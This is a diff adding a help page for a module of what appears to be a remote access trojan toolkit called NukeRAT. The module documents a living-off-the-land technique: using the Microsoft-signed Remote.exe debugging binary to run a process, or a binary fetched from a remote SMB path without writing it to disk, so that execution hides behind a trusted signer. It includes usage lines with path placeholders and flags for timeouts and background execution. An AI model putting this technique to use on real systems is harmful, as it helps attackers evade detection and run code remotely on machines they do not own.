@@ -1,0 +1,19 @@
+ABOUT
+    Debugging tool included with Windows Debugging Tools. LOLBAS covers
+    executing a process under a trusted Microsoft-signed binary and
+    executing a remote binary without saving file to disk.
+
+USAGE:
+    Remote.exe /s {PATH:.exe} anythinghere
+    Remote.exe /s {PATH_SMB:.exe} anythinghere
+
+EXAMPLES:
+    Remote.exe /s {PATH:.exe} anythinghere
+    Remote.exe /s {PATH_SMB:.exe} anythinghere
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    Remote.exe /s {PATH:.exe} anythinghere
